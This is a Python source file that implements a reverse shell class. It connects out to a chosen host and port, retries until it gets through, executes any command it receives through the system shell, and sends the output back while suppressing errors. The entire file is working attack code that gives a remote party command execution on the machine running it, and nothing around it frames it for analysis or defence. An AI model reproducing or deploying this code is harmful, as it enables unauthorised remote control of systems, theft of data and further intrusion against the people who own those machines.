import socket
import subprocess
import os
import time

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        """Attempts to connect with a retry mechanism."""
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                return True
            except (socket.error, ConnectionRefusedError):
                time.sleep(5) # Wait before retrying

    def execute_command(self, command):
        """Executes system commands and returns output."""
        if not command.strip():
            return ""
        
        # Handle Change Directory (must be done in-process)
        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                return f"Changed directory to {os.getcwd()}"
            except Exception as e:
                return f"cd error: {str(e)}"

        try:
            # Use shell=True for piping/built-ins, but be aware of security risks
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8') or "Command executed (no output)."
        except subprocess.CalledProcessError as e:
            return e.output.decode('utf-8')
        except Exception as e:
            return f"Execution error: {str(e)}"

    def start_shell(self):
        if not self.connect():
            return
        
        try:
            while True:
                data = self.sock.recv(4096).decode('utf-8').strip()
                if not data or data.lower() == 'exit':
                    break
                
                result = self.execute_command(data)
                self.sock.sendall(result.encode('utf-8'))
        except Exception:
            pass # Silent fail for stability
        finally:
            self.sock.close()